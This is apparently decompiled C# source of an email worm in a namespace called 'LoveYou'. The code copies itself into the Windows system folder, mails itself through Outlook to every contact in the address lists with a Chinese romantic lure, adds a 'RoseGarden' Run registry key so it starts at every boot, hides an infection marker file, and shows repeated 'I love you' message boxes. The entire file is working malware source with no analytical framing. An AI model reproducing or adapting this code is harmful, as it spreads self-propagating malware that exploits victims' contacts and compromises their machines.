using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Timers;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace LoveYou;

[StandardModule]
internal sealed class Module1
{
	[AccessedThroughProperty("Timer1")]
	private static Timer _Timer1;

	public const int FILE_ATTRIBUTE_HIDDEN = 2;

	public static object fs;

	public static Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Timer1 != null)
			{
				_Timer1.Elapsed -= Timer1_Elapsed;
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.Elapsed += Timer1_Elapsed;
			}
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long SetFileAttributesA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName, long dwFileAttributes);

	[STAThread]
	public static void Main()
	{
		if (StringType.StrCmp(Interaction.Command(), "", false) == 0)
		{
			fs = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("Scripting.FileSystemObject", ""));
			if (BooleanType.FromObject(ObjectType.NotObj(LateBinding.LateGet(fs, (Type)null, "FileExists", new object[1] { Environment.SystemDirectory + "\\" + Process.GetCurrentProcess().ProcessName + ".exe" }, (string[])null, (bool[])null))))
			{
				CopyMeToSystemFolder();
			}
			if (BooleanType.FromObject(ObjectType.NotObj(IsInfected())))
			{
				InfectByEmail();
			}
		}
		if (Strings.InStr(Interaction.Command(), "/t", (CompareMethod)0) != 0)
		{
			Timer1 = new Timer(50000.0);
			_Timer1.AutoReset = true;
			_Timer1.Enabled = true;
			while (true)
			{
			}
		}
		DoAction();
		ProjectData.EndApp();
	}

	private static void DoAction()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Invalid comparison between Unknown and I4
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Invalid comparison between Unknown and I4
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		if ((int)Interaction.MsgBox((object)"你知道我很爱你吗？", (MsgBoxStyle)36, (object)"提问") == 7)
		{
			if ((int)Interaction.MsgBox((object)"唉！算了，我每次这样问你，你都是这样．我真的很爱你，相信我好吗？", (MsgBoxStyle)36, (object)"提问") == 6)
			{
				Interaction.MsgBox((object)"真的吗？谢谢！我真的好高兴，你终于相信我说的了", (MsgBoxStyle)0, (object)null);
				return;
			}
			object obj = "";
			while (ObjectType.ObjTst(obj, (object)"", false) == 0)
			{
				obj = Interaction.InputBox("那你为什么不相信我呢？告诉我好吗？", "回答", "", -1, -1);
			}
			Interaction.MsgBox(ObjectType.StrCatObj(ObjectType.StrCatObj((object)"我就知道你会这么说！", obj), (object)"，你每次都这么告诉我，算了，我相信总有一天能让你明白的"), (MsgBoxStyle)0, (object)null);
		}
		else
		{
			Interaction.MsgBox((object)"真的吗？谢谢！我真的好高兴，你相信我说的话！", (MsgBoxStyle)0, (object)null);
		}
	}

	public static string GetSystemPath()
	{
		return Environment.SystemDirectory;
	}

	public static void InfectByEmail()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num = default(int);
		int num4 = default(int);
		object objectValue = default(object);
		object obj = default(object);
		object obj2 = default(object);
		object objectValue2 = default(object);
		object obj3 = default(object);
		object objectValue3 = default(object);
		object objectValue4 = default(object);
		object obj6 = default(object);
		object obj7 = default(object);
		object objectValue5 = default(object);
		object objectValue6 = default(object);
		Exception ex = default(Exception);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				object obj4;
				object[] array;
				object[] array2;
				object obj5;
				object obj8;
				object[] array5;
				object obj9;
				object obj10;
				object[] array4;
				object[] array6;
				bool[] array3;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 952:
					{
						int num2 = num + 1;
						num = 0;
						switch (num2)
						{
						case 0:
							break;
						case 1:
							goto IL_0008;
						case 2:
							goto IL_0021;
						case 3:
							goto IL_003a;
						case 4:
							goto IL_0066;
						case 5:
							goto IL_00ac;
						case 6:
							goto IL_00f3;
						case 7:
							goto IL_013f;
						case 8:
							goto IL_0184;
						case 9:
							goto IL_01cb;
						case 10:
							goto IL_01f9;
						case 11:
							goto IL_0257;
						case 12:
							goto IL_027c;
						case 13:
							goto IL_02a1;
						case 14:
							goto IL_02f3;
						case 15:
							goto IL_030c;
						case 16:
							goto IL_0330;
						case 17:
							goto IL_0337;
						case 18:
						case 19:
							goto IL_033e;
						case 20:
							goto IL_0362;
						case 21:
							goto end_IL_0000;
						case 22:
							goto end_IL_0000_2;
						default:
							goto IL_0468;
						}
						goto default;
					}
					IL_0008:
					num4 = 1;
					objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
					goto IL_0021;
					IL_0021:
					num4 = 2;
					obj = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("Outlook.Application", ""));
					goto IL_003a;
					IL_003a:
					num4 = 3;
					obj2 = RuntimeHelpers.GetObjectValue(LateBinding.LateGet(obj, (Type)null, "GetNameSpace", new object[1] { "MAPI" }, (string[])null, (bool[])null));
					goto IL_0066;
					IL_0066:
					num4 = 4;
					if (FlowControl.ForLoopInitObj(objectValue2, (object)1, LateBinding.LateGet(LateBinding.LateGet(obj2, (Type)null, "AddressLists", new object[0], (string[])null, (bool[])null), (Type)null, "Count", new object[0], (string[])null, (bool[])null), (object)1, ref obj3, ref objectValue2))
					{
						goto IL_00ac;
					}
					goto IL_0362;
					IL_00ac:
					num4 = 5;
					obj4 = obj2;
					array = new object[1] { RuntimeHelpers.GetObjectValue(objectValue2) };
					array2 = array;
					array3 = new bool[1] { true };
					obj5 = LateBinding.LateGet(obj4, (Type)null, "AddressLists", array2, (string[])null, array3);
					if (array3[0])
					{
						objectValue2 = RuntimeHelpers.GetObjectValue(array[0]);
					}
					objectValue3 = RuntimeHelpers.GetObjectValue(obj5);
					goto IL_00f3;
					IL_0330:
					num4 = 16;
					obj = null;
					goto IL_0337;
					IL_030c:
					num4 = 15;
					if (FlowControl.ForNextCheckObj(objectValue4, obj6, ref objectValue4))
					{
						goto IL_0184;
					}
					goto IL_0330;
					IL_00f3:
					num4 = 6;
					if (ObjectType.ObjTst(Conversion.Int(RuntimeHelpers.GetObjectValue(LateBinding.LateGet(LateBinding.LateGet(objectValue3, (Type)null, "AddressEntries", new object[0], (string[])null, (bool[])null), (Type)null, "Count", new object[0], (string[])null, (bool[])null))), Conversion.Int(RuntimeHelpers.GetObjectValue(obj7)), false) > 0)
					{
						goto IL_013f;
					}
					goto IL_033e;
					IL_013f:
					num4 = 7;
					if (FlowControl.ForLoopInitObj(objectValue4, (object)1, LateBinding.LateGet(LateBinding.LateGet(objectValue3, (Type)null, "AddressEntries", new object[0], (string[])null, (bool[])null), (Type)null, "Count", new object[0], (string[])null, (bool[])null), (object)1, ref obj6, ref objectValue4))
					{
						goto IL_0184;
					}
					goto IL_0330;
					IL_0184:
					num4 = 8;
					obj8 = objectValue3;
					array4 = new object[1] { RuntimeHelpers.GetObjectValue(objectValue4) };
					array5 = array4;
					array3 = new bool[1] { true };
					obj9 = LateBinding.LateGet(obj8, (Type)null, "AddressEntries", array5, (string[])null, array3);
					if (array3[0])
					{
						objectValue4 = RuntimeHelpers.GetObjectValue(array4[0]);
					}
					objectValue5 = RuntimeHelpers.GetObjectValue(obj9);
					goto IL_01cb;
					IL_033e:
					num4 = 19;
					if (FlowControl.ForNextCheckObj(objectValue2, obj3, ref objectValue2))
					{
						goto IL_00ac;
					}
					goto IL_0362;
					IL_0337:
					num4 = 17;
					obj2 = null;
					goto IL_033e;
					IL_01cb:
					num4 = 9;
					objectValue6 = RuntimeHelpers.GetObjectValue(LateBinding.LateGet(obj, (Type)null, "CreateItem", new object[1] { 0 }, (string[])null, (bool[])null));
					goto IL_01f9;
					IL_01f9:
					num4 = 10;
					obj10 = LateBinding.LateGet(objectValue6, (Type)null, "Recipients", new object[0], (string[])null, (bool[])null);
					array4 = new object[1] { RuntimeHelpers.GetObjectValue(objectValue5) };
					array6 = array4;
					array3 = new bool[1] { true };
					LateBinding.LateCall(obj10, (Type)null, "Add", array6, (string[])null, array3);
					if (array3[0])
					{
						objectValue5 = RuntimeHelpers.GetObjectValue(array4[0]);
					}
					goto IL_0257;
					IL_0362:
					num4 = 20;
					LateBinding.LateCall(objectValue, (Type)null, "RegWrite", new object[2]
					{
						"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\RoseGarden",
						GetSystemPath() + "\\" + Process.GetCurrentProcess().ProcessName + ".exe /t"
					}, (string[])null, (bool[])null);
					break;
					IL_0257:
					num4 = 11;
					LateBinding.LateSet(objectValue6, (Type)null, "Subject", new object[1] { "知道吗？" }, (string[])null);
					goto IL_027c;
					IL_027c:
					num4 = 12;
					LateBinding.LateSet(objectValue6, (Type)null, "Body", new object[1] { "\r\nHi! \r\n你知道我很想你吗？看看我特意为你准备的礼物吧！\r\n ..." }, (string[])null);
					goto IL_02a1;
					IL_02a1:
					num4 = 13;
					LateBinding.LateCall(LateBinding.LateGet(objectValue6, (Type)null, "Attachments", new object[0], (string[])null, (bool[])null), (Type)null, "Add", new object[1] { Environment.CurrentDirectory + "\\" + Process.GetCurrentProcess().ProcessName + ".exe" }, (string[])null, (bool[])null);
					goto IL_02f3;
					IL_02f3:
					num4 = 14;
					LateBinding.LateCall(objectValue6, (Type)null, "Send", new object[0], (string[])null, (bool[])null);
					goto IL_030c;
					end_IL_0000:
					break;
				}
				num4 = 21;
				MarkInfected();
				end_IL_0000_2:;
			}
			catch (object obj11) when ((obj11 is Exception && num3 != 0 && num == 0) ? true : false)
			{
				Exception obj12 = (Exception)obj11;
				ProjectData.SetProjectError(obj12);
				ex = obj12;
				if (num != 0)
				{
					goto IL_0468;
				}
				num = num4;
				switch (num3)
				{
				case 1:
					try0000_dispatch = 952;
					break;
				default:
					throw;
				}
				continue;
			}
			break;
			IL_0468:
			throw ex;
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void MarkInfected()
	{
		object objectValue = RuntimeHelpers.GetObjectValue(LateBinding.LateGet(fs, (Type)null, "CreateTextFile", new object[1] { "c:\\$windir$.log" + StringType.FromChar(Strings.Chr(255)) }, (string[])null, (bool[])null));
		LateBinding.LateCall(objectValue, (Type)null, "write", new object[1] { "Install date:" + StringType.FromDate(DateTime.Now) }, (string[])null, (bool[])null);
		LateBinding.LateCall(objectValue, (Type)null, "Close", new object[0], (string[])null, (bool[])null);
		string lpFileName = "c:\\$windir$.log" + StringType.FromChar(Strings.Chr(255));
		SetFileAttributesA(ref lpFileName, 2L);
	}

	public static object IsInfected()
	{
		return RuntimeHelpers.GetObjectValue(LateBinding.LateGet(fs, (Type)null, "FileExists", new object[1] { "C:\\$windir$.log" + StringType.FromChar(Strings.Chr(255)) }, (string[])null, (bool[])null));
	}

	public static void CopyMeToSystemFolder()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num = default(int);
		int num4 = default(int);
		Exception ex = default(Exception);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					break;
				case 92:
					{
						int num2 = num + 1;
						num = 0;
						switch (num2)
						{
						case 0:
							break;
						case 1:
							goto end_IL_0000;
						case 2:
							goto end_IL_0000_2;
						default:
							goto IL_00b0;
						}
						goto default;
					}
					end_IL_0000:
					break;
				}
				num4 = 1;
				LateBinding.LateCall(fs, (Type)null, "CopyFile", new object[2]
				{
					Environment.CurrentDirectory + "\\" + Process.GetCurrentProcess().ProcessName + ".exe",
					GetSystemPath() + "\\"
				}, (string[])null, (bool[])null);
				end_IL_0000_2:;
			}
			catch (object obj) when ((obj is Exception && num3 != 0 && num == 0) ? true : false)
			{
				Exception obj2 = (Exception)obj;
				ProjectData.SetProjectError(obj2);
				ex = obj2;
				if (num != 0)
				{
					goto IL_00b0;
				}
				num = num4;
				switch (num3)
				{
				case 1:
					try0000_dispatch = 92;
					break;
				default:
					throw;
				}
				continue;
			}
			break;
			IL_00b0:
			throw ex;
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void Timer1_Elapsed(object sender, ElapsedEventArgs e)
	{
		DoAction();
	}
}
